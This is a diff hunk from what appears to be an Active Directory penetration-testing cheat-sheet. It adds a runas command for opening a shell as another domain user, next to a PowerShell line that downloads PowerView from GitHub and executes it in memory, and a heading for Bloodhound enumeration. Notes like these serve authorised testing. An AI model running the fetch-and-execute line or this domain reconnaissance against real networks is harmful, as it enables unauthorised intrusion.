@@ -57,6 +57,10 @@ Download
 iex(iwr("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1"))
 ```
 
+```cmd
+runas /user:[Domain]\[user] cmd
+```
+
 ## Enumeration
 
 #### Bloodhound
